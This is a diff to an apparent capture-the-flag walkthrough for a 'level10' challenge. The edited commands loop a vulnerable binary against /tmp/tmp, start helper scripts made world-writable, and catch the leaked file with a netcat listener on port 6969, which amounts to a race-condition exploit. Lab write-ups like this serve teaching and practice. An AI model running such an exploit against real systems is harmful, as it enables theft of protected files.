@@ -614,20 +614,19 @@ done
 
 ```b
 while true; do  
-  /home/user/level10/level10 /tmp/tmp $(ifconfig|grep 'inet '|awk 'NR==2 {print $2}'|cut -d ":" -f2) >/dev/null
+  /home/user/level10/level10 /tmp/tmp $(ifconfig|grep 'inet '|awk 'NR==1{first=$0}END{print $2}'|cut -d ":" -f2) >/dev/null
   #/home/user/level10/level10 /tmp/tmp $(hostname -I|cut -d' ' -f2) >/dev/null
 done
 ```
 ```b
-> chmod 777 /tmp/alt.sh /tmp/go.sh
+> chmod 777 /tmp/alt.sh /tmp/run.sh
 
-> \
-bash /tmp/alt.sh 2>/dev/null & \
-bash /tmp/go.sh  2>/dev/null & \
+> bash /tmp/alt.sh 2>/dev/null & bash /tmp/run.sh  2>/dev/null & \
 nc -kl 6969 | grep -E '[a-z0-9]'
 	OR
 nc -kl 6969 | grep -v '[][()]'
-
+```
+```b
 > kill $(jobs -p)
 ```
 
